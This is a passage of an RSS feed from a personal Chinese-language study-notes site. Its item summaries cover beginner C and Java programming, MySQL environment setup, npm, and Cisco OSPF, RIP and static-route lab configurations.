配置 MySQL 环境变量  此电脑 — 系统属性 — 高级系统设置 — 高级 — 环境变量 。 找到系统变量中名为 Path 的变量， 新建，将 MySql 目录下的 bin 文件的路径粘贴到这里，确定。 win + R 打开 cmd，输入 mysql，如果提示ERROR 2003 (HY000): Can&#39;t connect to MySQL server on &#39;localhost&#39; (10061)就说明 MySQL 的环境变量配置完成。  !</description>
    </item>
    
    <item>
      <title>C 递归</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%87%BD%E6%95%B0/%E9%80%92%E5%BD%92/</link>
      <pubDate>Thu, 24 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%87%BD%E6%95%B0/%E9%80%92%E5%BD%92/</guid>
      <description>递归 函数自身调用自身。</description>
    </item>
    
    <item>
      <title>C 函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Wed, 23 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 每个 C 程序都至少有一个函数，即主函数 main() ，所有简单的程序都可以定义其他额外的函数。
函数还有很多叫法，比如方法、子例程或程序，等等。
#include &amp;lt;iostream&amp;gt; // void 表示这个 max 函数没有返回值（但可以有 reture，但不能 reture 表达式） void max(int i,int j) {  if(i &amp;gt; j)  {  printf(&amp;#34;%d\n&amp;#34;,i);  }  else  {  printf(&amp;#34;%d\n&amp;#34;,j);  } }  // int 表示 main 函数返回一个整型的值 // 程序从 main 函数进入 void 表示该函数不能接收参数。 int main(void) {  int a = 1;  int b = 5;  max(a,b); } 优点  避免了重复性的操作。 有利于程序的模块化。  特点 能够接受参数，（但也可以不接收）</description>
    </item>
    
    <item>
      <title>C 数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84/</link>
      <pubDate>Mon, 21 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84/</guid>
      <description>数组 数组是用于储存多个相同类型数据的集合。
在 C 语言中，与数组相关的方法很少，大部分操作，都只能自己去实现，比如排序，查找等等。
#include &amp;lt;iostream&amp;gt; int main(void){ // arr 是数组的名字，5 表示数组中，元素的个数，  int arr[5] = {1,2,3,4,5};  printf(&amp;#34;%d\n&amp;#34;,arr[4]); } 在 C 语言中，一个数组的名字是这个数组第一个元素的指针地址。
特点 数组是连续的、线性的，在内存中亦是如此。
数组的数量，一旦定义，无法修改。
数组的类型取决于该数组存储的元素的类型。
优点 存取速度快。
缺点 需要一个连续的、很大的内存。
插入和删除元素的效率很低。</description>
    </item>
    
    <item>
      <title>C 指针的使用</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      <description>指针的使用 互换两个数字 #include &amp;lt;stdio.h&amp;gt;//*p = 1 *q = 5 void interchange(int * p,int * q) { // 将 t 作为两个值的互换媒介。  int t; // t = 1  t = *p; // *p = 5  *p = *q; // *q = 1  *q = t; } // 因为 *p 和 *q 分别指向于 a 和 b，所以，修改 *p 和 *q，就相当于修改 a 和 b， // 尽管 *p 和 *q 在函数指向完毕后已经被释放，但程序依旧通过 *p 和 *q，分别修改了 a 和b。 // 而 p 和 q，两者和 a 、b，并不一样，因为 p、q 中，存放的是指向 a、b 的地址。 // 由此可得出一个结论，函数的形参和实参， 永远不是一个 int main () {  int a = 1;  int b = 5; // 取 a、b 的地址  interchange(&amp;amp;a,&amp;amp;b);  printf(&amp;#34;a = %d,b = %d&amp;#34;,a,b); } 通过被调函数修改主调函数普通变量的值 函数的实参必须为该普通变量的地址。</description>
    </item>
    
    <item>
      <title>CodeBlocks 的使用</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B1%89%E5%8C%96-codeblocks/</link>
      <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B1%89%E5%8C%96-codeblocks/</guid>
      <description>CodeBlocks 的使用 codebooks 快捷键 注释 使用Ctrl + Shift + C快速注释。
使用Ctrl + Shift + X取消注释。
汉化 CodeBlocks 将汉化文件zh_CN.mo放置到路径D:\AppInstallPath\CodeBlocks\share\CodeBlocks\locale\zh_CN（没有文件夹就自行创建）
打开 CodeBlocks，Settings — Environment — View — Internationalization(勾选)，选择Chinese(Simplified)</description>
    </item>
    
    <item>
      <title>C CPU 如何对内存条进行处理</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/cpu-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%86%85%E5%AD%98%E6%9D%A1%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/cpu-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%86%85%E5%AD%98%E6%9D%A1%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86/</guid>
      <description>CPU 如何对内存条进行处理 CUP 处理内存条中的数据时，需要通过控制线（只读或只写）、数据线（数据传输）和地址线（确定将要处理的是哪一个内存单元）处理内存条中的数据。
32 位系统最大支持 4G 内存。
64 位 系统最大支持 192G 内存。</description>
    </item>
    
    <item>
      <title>C 基本类型指针</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%8C%87%E9%92%88/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%8C%87%E9%92%88/</guid>
      <description>基本类型指针 #include &amp;lt;stdio.h&amp;gt; int main () { 	int * p; // 定义一个指针变量 p，且这个 p 只能存放 int 类型的地址， 	int i = 20; 	p = &amp;amp;i; // &amp;amp;i 表示获取变量 i 的内存地址 //这时候 p 中，存放的就是指向变量 i 的内存地址，则 p 完全等同于 i.  	int j = * p; 	printf(&amp;#34;i = %d ,j = %d \n&amp;#34;,i,j);  	return 0; } 详解 *p #include &amp;lt;iostream&amp;gt;int main() {  int * p;  int i = 5;  p = &amp;amp;i; // p 保存了 i 的地址 // 修改 p 不会影响 i；修改 i 也不会影响 p，因为他们是不同的变量。 // *p = i，此时，修改 *p 就是修改 i，修改 i 就是修改 *p // 更准确的说，*p 是以 p 的内容为地址的变量。  *p = 99;  printf(&amp;#34;i = %d,p = %d \n&amp;#34;,i,*p);  i = 88;  printf(&amp;#34;i = %d,p = %d \n&amp;#34;,i,*p); } </description>
    </item>
    
    <item>
      <title>C 指针</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88/</guid>
      <description>指针 指针是 C 语言的灵魂。
指针是一个地址，地址是内存单元的编号，它是一个从零开始的非负整数；比如在 32 位系统中，地址的取值范围是 0 — 4 G（4095）。
指针本质就是一个操作受限的非负整数。
指针只能进行减法运算，不能进行加乘除等运算。
指针变量是存放编号的变量。
八位（Bit）是一个字节，一个字节就是一个内存单元。
int* 是 指向整型变量的指针，
作用   表示一些复杂的数据结构（树、图）。
  快速的传递数据，并且减少了内存的耗费。
  使函数返回一个以上的值。
  可以直接访问硬件。
  更方便的处理字符串（&amp;rsquo;\0&amp;rsquo;）。
  </description>
    </item>
    
    <item>
      <title>C 星号的含义</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%98%9F%E5%8F%B7%E7%9A%84%E5%90%AB%E4%B9%89/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%98%9F%E5%8F%B7%E7%9A%84%E5%90%AB%E4%B9%89/</guid>
      <description>星号的含义 </description>
    </item>
    
    <item>
      <title>C printf</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/printf/</link>
      <pubDate>Tue, 04 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/printf/</guid>
      <description>printf 用于将变量的内容输出到显示器。
直接输出 printf(&amp;#34;字符串&amp;#34;); print(&amp;ldquo;输出控制符&amp;rdquo;,参数) int i = 10;//将数值 10 的二进制代码储存到变量 i 中 。 printf(&amp;#34;%o&amp;#34;, a);//将变量 i（数值 10） 的二进制代码以八进制输出，a 为参数。 printf(&amp;ldquo;输出控制符 1 输出控制符 2&amp;rdquo;,参数 1,参数 2)  int a = 10;  int i = 15;  printf(&amp;#34;%d %d\n&amp;#34;, a, i);//控制符和参数必须一一对应。 printf(&amp;ldquo;输出控制符 非输出控制符&amp;rdquo;,参数) int a = 10;//将数值 10 的二进制代码储存到变量 i 中 。 printf(&amp;#34;%o\n&amp;#34;,a);//将变量 i（数值 10 的二进制代码以八进制输出；\n 为非输出控制符。 C 语言中的所有基本类型以及对应的输出符  int，用%d输出。 long int，用%ld输出。 shot int， char，用%c输出。 float，用%f输出，另外，%.2f表示输出的数保留两位小数。 double，用%lf输出。  </description>
    </item>
    
    <item>
      <title>C scanf</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/scanf/</link>
      <pubDate>Mon, 03 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/scanf/</guid>
      <description>scanf 通过键盘将数据输入到变量中。
将从键盘输入的字符转化为输入控制符所规定类型的数据，然后存入以输入参数的值为地址的变量中。
使用 scanf 之前先使用 printf 提示用户以什么样的方式输入内容。
scanf 中使用非输入控制符时，尽量使用空格，不建议使用其他的符号。
scanf(&amp;ldquo;输入控制符&amp;rdquo;,输入参数) int i; scanf(&amp;#34;%d&amp;#34;,&amp;amp;i);//i&amp;amp; 表示变量 i 的地址，&amp;amp; 是一个取地址符，也就是将输入的整数类型的值放入到变量 i 中。 printf(&amp;#34;%d\n&amp;#34;,i); scanf(&amp;ldquo;非输入控制符 输入控制符&amp;rdquo;,输入参数) int i; scanf(&amp;#34;z%d&amp;#34;,&amp;amp;i);//非输入控制符 z （z 可以是任意值）必须同输入控制符一起输入 。 printf(&amp;#34;i = %d\n&amp;#34;,i); </description>
    </item>
    
    <item>
      <title>C switch</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/switch/</link>
      <pubDate>Mon, 03 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/switch/</guid>
      <description>switch 它是一种选择控制语句。
switch 是选择控制语句，而不是循环控制语句，如果在 switch 中出现了 berak 语句，该语句的功
能只是退出 switch 语句并转去执行这个 switch 下面的语句。
在 switch 中，出现 continue 是错误的，除非当前 switch 在 for 或 while 之中。
当我们使用它时，它会去寻找与表达式结果所匹
的子表达式（case），并执行子表达式后面的所有
语句，直到遇到 break 停止执行。
#include &amp;lt;stdio.h&amp;gt; int main () {  char fraction ; 	printf(&amp;#34;请输入您的等级：&amp;#34;); 	scanf(&amp;#34;%c&amp;#34;, &amp;amp;fraction); 	// 测试请键入 A 	switch(fraction) { 	case &amp;#39;A&amp;#39; : 	printf(&amp;#34;很棒！\n&amp;#34; ); 	case &amp;#39;B&amp;#39; : 	printf(&amp;#34;还不错哦\n&amp;#34; ); 	case &amp;#39;C&amp;#39; : 	printf(&amp;#34;做得好\n&amp;#34; ); 	break; 	case &amp;#39;D&amp;#39; : 	printf(&amp;#34;您通过了\n&amp;#34; ); 	break; 	case &amp;#39;F&amp;#39; : 	printf(&amp;#34;最好再试一下\n&amp;#34; ); 	break; 	default : 	printf(&amp;#34;无效的成绩\n&amp;#34; ); 	} 	printf(&amp;#34;您的等级是 %c\n&amp;#34;, fraction);  	return 0;  } 当我们键入 A 时，会发现程序不仅仅执行了与主</description>
    </item>
    
    <item>
      <title>库，框架，架构，平台的区别</title>
      <link>https://note.yxzi.xyz/note/technology/frame/%E5%BA%93%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Tue, 21 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/%E5%BA%93%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>库，框架，架构，平台的区别 库（Library） 库是一系列预先编写好的代码集合，供开发者在编程中调用，大大减少重复工作量。
库的概念很宽泛。
程序员第一次输出 Hello World 用的 printf 就来自 C 语言标准库；
各种 SDK 都是库；
从 npm、Maven、Nuget 下载的包都是库；
你自己写一个字符串处理函数，包装好之后调用，也是库。
框架（Framework） 框架是库的一种。很多人会把框架和普通库的区别仅仅理解为规模和复杂度，其实不然。
jQuery 的规模够大了，但仍然是库，不是框架。
框架的最大特征是它会接管程序的主控制流，开发者只需编写业务逻辑代码，具体执行工作由框架来调用。实践中经常会用到控制反转（IoC）以及模板类继承等方式。
比如用 Spring 开发 Web 项目，你只需编写 Controller 和配置文件。具体到项目如何启动、如何监听端口、每一次网络请求的响应处理，这些都由框架来实现。
所以一般来说单个项目可以引入很多库，却不能用多个框架。
同时用 jQuery 和 Vue 没问题，但同时用 Vue 和 React 就不行。
因为主控制流只有一个。
架构（Architecture） 架构与前面两个的区别不仅仅是规模更大，而且它是个抽象概念，不涉及具体语言和代码实现。
它可以是编程模式，比如 MVC 架构、MVVM 架构，只是规定了代码如何进行逻辑分离。每种语言都有自己的 MVC 框架；
也可以是客户端形式，比如多年前常谈的 B/S、C/S 架构；
还可以是服务器端结构，比如分布式架构、微服务架构；
再比如说数据库，为了让客户放心你可以吹自己用的是业内顶端的高可用高一致性弹性伸缩多机房异地容灾双活架构（实际是阿里云每月八百块买的）；
等等等等。
所以说架构师的价值并不在于写代码快、Bug 少、熟练使用某些库与框架，而是掌握并评估项目的什么地方适合用什么架构。
大方向一旦出了问题，比写几处错误代码的影响可大多了。
平台（Platform） 平台又是另一回事，区别就在于前三者属于技术领域的概念，平台则属于业务领域的概念。
只要是运行中的程序通过本机或网络 API 对外提供服务，无论是小规模的单个接口、大规模的云端集群服务，都可以称为平台。
操作系统是平台，它提供你的应用程序与硬件、软件、网络交互的渠道；
浏览器是平台，与操作系统的主要区别在于开发语言单一、权限控制较严；
各互联网服务商自然是平台，提供物理主机、虚拟主机、云主机、容器、Serverless 等等并通过网络进行部署和访问；
以及常见的通知推送平台、短信平台、统计分析平台等等等。
 当然，以上所有概念在网上经常出现混淆，但也不算什么严重的错误。</description>
    </item>
    
    <item>
      <title>Java IO 流</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/io-%E6%B5%81/</link>
      <pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/io-%E6%B5%81/</guid>
      <description>IO 流 import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream;  public class ShuRuShuChu {  public static void main(String[]args) throws Exception { //写入  String str=&amp;#34;写入成功！&amp;#34;;  File xieru=new File(&amp;#34;C:\\Users\\admin\\Desktop\\期末考试\\李白.txt&amp;#34;);  FileOutputStream fos=new FileOutputStream(xieru,true);  byte[] words=str.getBytes();  fos.write(words,0,words.length);  //读取  File file2 = new File(&amp;#34;C:\\Users\\admin\\Desktop\\期末考试\\李白.txt&amp;#34;);  FileInputStream fis = new FileInputStream(file2);  byte[] b = new byte[1024];  int len = fis.read(b);  while (len != -1) {  String data = new String(b);  System.</description>
    </item>
    
    <item>
      <title>Java 卖票问题</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E5%8D%96%E7%A5%A8%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E5%8D%96%E7%A5%A8%E9%97%AE%E9%A2%98/</guid>
      <description>卖票 Ticket Class public class Ticket {  public static int chepiao = 1000;  public String name;  public String a = new String(&amp;#34;222&amp;#34;);   public Ticket(String name) {  this.name = name;  }   public void run() {  while (true) {  synchronized (a) {  if (chepiao &amp;gt; 0) {  System.out.println(this.name + &amp;#34;正在卖第&amp;#34; + (1001 - chepiao) + &amp;#34;张票&amp;#34;);  chepiao--;  } else {  break;  }  }   }  } } ThreadOne Class public class ThreadOne implements Runnable {  public static int chepiao = 1000;  public String name;  public static String aa = new String(&amp;#34;111&amp;#34;);   public ThreadOne(String name) {  this.</description>
    </item>
    
    <item>
      <title>Java 生产者消费者模式</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/</guid>
      <description>生产者消费者模式 工厂类 public class Factory {  int num=0;   //库存 // 开始生产  public synchronized void addProduct() throws InterruptedException {  if(num &amp;gt;= 10){  System.out.println(&amp;#34;库存已满，不能再生产了!&amp;#34;);  //强制当前线程等待，知道其他线程在同一个对象调用notify()方法后释放  this.wait();  }else {  Thread.sleep(1000);  num++; //生产出商品  System.out.println(&amp;#34;生产者生产了一个商品，当前库存为: &amp;#34; + num);  //唤醒消费商品的线程  this.notify();  }  }  //开始消费  public synchronized void subProduct() throws InterruptedException {  if(num == 0){  System.out.println(&amp;#34;商品已经被抢光了！请等待补货...&amp;#34;);  this.</description>
    </item>
    
    <item>
      <title>Java 继承</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E7%BB%A7%E6%89%BF/</link>
      <pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E7%BB%A7%E6%89%BF/</guid>
      <description>继承 Phone Class public class Phone extends Dianhua implements Mp3 {  public void playmusic(){  System.out.println(&amp;#34;播放音乐&amp;#34;);  }  public void call(){  System.out.println(&amp;#34;可以打电话&amp;#34;);  }  public void dh(){  System.out.println(&amp;#34;可以高得地图导航&amp;#34;);  } } Telephone Class public abstract class Telephone {  public abstract void call();  public abstract void dh(); } Mp3 Interface public interface Mp3 {  abstract void playmusic(); } Test Class public class Test {  public static void main(String[] args) {  Phone c=new Phone();  c.</description>
    </item>
    
    <item>
      <title>Cisco 配置单区域 OSPFv2</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E5%8D%95%E5%8C%BA%E5%9F%9F-ospfv2/</link>
      <pubDate>Sun, 12 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E5%8D%95%E5%8C%BA%E5%9F%9F-ospfv2/</guid>
      <description>配置单区域 OSPFv2 配置 R1 enableconfigure terminalrouter ospf 10router-id 1.1.1.1network 172.16.1.0 0.0.0.255 area 0network 172.16.3.0 0.0.0.3 area 0network 192.168.10.4 0.0.0.3 area 0passive-interface GigabitEthernet0/0 配置 R2 enableconfigure terminalrouter ospf 10router-id 2.2.2.2network 172.16.2.0 0.0.0.255 area 0network 172.16.3.0 0.0.0.3 area 0network 192.168.10.8 0.0.0.3 area 0passive-interface GigabitEthernet0/0 配置 R3 enableconfigure terminalrouter ospf 10router-id 3.3.3.3network 192.168.1.0 0.0.0.255 area 0network 192.</description>
    </item>
    
    <item>
      <title>Css 选择器</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E9%80%89%E6%8B%A9%E5%99%A8/</link>
      <pubDate>Sun, 12 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E9%80%89%E6%8B%A9%E5%99%A8/</guid>
      <description>选择器 ID 选择器，尽量少用，</description>
    </item>
    
    <item>
      <title>OSPF 协议</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/ospf-%E5%8D%8F%E8%AE%AE/</link>
      <pubDate>Thu, 09 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/ospf-%E5%8D%8F%E8%AE%AE/</guid>
      <description>OSPF 协议 OSPF 是目前网络界耳熟能详的协议了。
用带宽来判断路径的优劣弥补了 RIP 的缺陷（光凭带宽也不是很好），同时使用划分区域网络，可以更好的控制管理和扩展网络。
还有各种小特点比如 DR、BDR 机制，和适合不同网络类型机制，以及使用不同 LSA 传递各种信息，各种 LSA 的特性也不通。
所有综合来讲 OSPF 是比较适合大众选择的一款路由协议
router ospf 10 配置 OSPF 路由，进程 ID 为 10
router-id 1.1.1.1 配置路由器的路由器 ID
子网掩码的反掩码 IP 地址：192.168.10.8/30，那么它的子网掩码为 255.255.255.252
则它的子网掩码的反掩码为 255.255.255.255 减去 255.255.255.252 等于 0.0.0.3，
即配置 OSPFv2 的网络通告为：
network 192.168.10.8 0.0.0.3 area 0 其中 area 是自治系统区域的标识</description>
    </item>
    
    <item>
      <title>交换机</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E4%BA%A4%E6%8D%A2%E6%9C%BA/</link>
      <pubDate>Thu, 09 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E4%BA%A4%E6%8D%A2%E6%9C%BA/</guid>
      <description>交换机 Trunk 和 Access trunk 行通过多个 VLAN。
access 只允许通通过单个 VLAN。</description>
    </item>
    
    <item>
      <title>Cisco 静态和动态路由的优缺点</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%9D%99%E6%80%81%E5%92%8C%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</link>
      <pubDate>Tue, 07 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%9D%99%E6%80%81%E5%92%8C%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</guid>
      <description>静态和动态路由的优缺点 静态路由的优点：  占用资源较多。 便于管理员了解路由。 易于配置。  静态路由的缺点：  配置和维护耗费时间。 配置容易出错，尤其对于大型网络。 需要管理员维护变化的路由信息。 不能随着网络的增长而扩展；维护会越来越麻烦。 需要完全了解整个网络的情况才能进行操作。  动态路由的优点  增加或删除网络时，管理员维护路由配置的工作量较少。 网络拓扑结构发生变化时，协议可以自动做出调整。 配置不容易出错。 扩展性好，网络增长时不会出现问题。  动态路由的缺点  需要占用路由器资源（CPU 时间、内存和链路带宽）。 管理员需要掌握更多的网络知识才能进行配置、验证和故障排除工作。  </description>
    </item>
    
    <item>
      <title>Cisco 配置 Rip V2</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE-rip-v2/</link>
      <pubDate>Fri, 03 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE-rip-v2/</guid>
      <description>配置 Rip V2 配置 R1 enableconfigure terminalip route 0.0.0.0 0.0.0.0 s0/0/1router ripversion 2no auto-summarynetwork 192.168.1.0network 192.168.2.0passive-interface gig 0/0default-information originate 配置 R2 enableconf trouter ripversion 2no auto-summarynetwork 192.168.2.0network 192.168.3.0network 192.168.4.0passive-interface gig 0/0 配置 R3 enableconf trouter ripversion 2no auto-summarynetwork 192.168.4.0network 192.168.5.0passive-interface gig 0/0 </description>
    </item>
    
    <item>
      <title>Cisco 配置静态路由</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/</link>
      <pubDate>Fri, 03 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/</guid>
      <description>配置静态路由 配置 R1 enableconfigure terminalip route 172.31.0.0 255.255.255.0 172.31.1.193ip route 172.31.1.196 255.255.255.252 172.31.1.193ip route 172.31.1.128 255.255.255.192 172.31.1.193 配置 R2 enableconfigure terminalip route 172.31.1.0 255.255.255.128 172.31.1.194ip route 172.31.1.0 255.255.255.192 172.31.1.198ip route 172.31.1.128 255.255.255.192 172.31.1.198 配置 R3 enableconfigure terminalip route 0.0.0.0 0.0.0.0 172.31.1.197 </description>
    </item>
    
    <item>
      <title>Cisco 路由</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E8%B7%AF%E7%94%B1/</link>
      <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E8%B7%AF%E7%94%B1/</guid>
      <description>路由 ipv6 unicast-routing 全局开启 IPV6 路由功能
show ip route static 显示该路由器路由表中的静态路由
其他概念 PC 的默认网关必须和路由器对应接口（比如 g0/0 和 g0/1）的 ip 地址相同。
路由表中没有目标 ip，要么丢弃 ip，要么发给默认网关
直连网络 指的是与当前路由器直接相链接的网络。
远程网络 对于一个路由器来说，除了直连网络之外的网络都是远程网络。
主机位和网络位 一个 IP 地址的网络位是该地址的前三位。
一个 IP 地址的主机位是该地址的第四位。
当一个 IP 地址的主机位全为 0 的时候，这个 IP 地址为网络地址
当一个 IP 地址的主机位全为 1 的时候，这个 IP 地址为广播地址
下一跳路由 仅指定下一个目标路由器的接口的 IP 地址，也叫递归静态路由
直连静态路由 仅指定当前路由器的送出接口的端口号
默认静态路由 指定下一跳 IP 地址或当前路由器送出接口
ip route 0.0.0.0 0.0.0.0 192.168.1.2ip route 0.0.0.0 0.0.0.0 s0/0/0 完全指定静态路由 指定下一跳 IP 地址和当前路由器送出接口，</description>
    </item>
    
    <item>
      <title>Cisco 静态路由故障排除</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4/</link>
      <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4/</guid>
      <description>配置 R2 进入全局模式
enableconfigure terminal 故障一 no ip route 172.31.1.0 255.255.255.128 172.31.1.198ip route 172.31.1.0 255.255.255.128 172.31.1.194 故障二 no ip route 172.31.1.128 255.255.255.192 172.31.1.194ip route 172.31.1.128 255.255.255.192 172.31.1.198 配置 R3 进入全局模式
enableconfigure terminal 故障三 ip route 172.31.1.0 255.255.255.128 172.31.1.197 </description>
    </item>
    
    <item>
      <title>npm</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/npm/</link>
      <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/npm/</guid>
      <description>npm npm 是Node.js的开放式模块登记和管理系统，是Node.js包的标准发布平台，用于Node.js包的发布、传播、依赖控制。
npm 提供了命令行工具，可以方便地下载、安装、升级、删除包，也可以让你作为开发者发布并维护包。
NPM 官网
安装 安装 Node.js自带 npm，所以安装 Node.js</description>
    </item>
    
    <item>
      <title>Java 字符流和字节流</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E5%AD%97%E7%AC%A6%E6%B5%81%E5%92%8C%E5%AD%97%E8%8A%82%E6%B5%81/</link>
      <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E5%AD%97%E7%AC%A6%E6%B5%81%E5%92%8C%E5%AD%97%E8%8A%82%E6%B5%81/</guid>
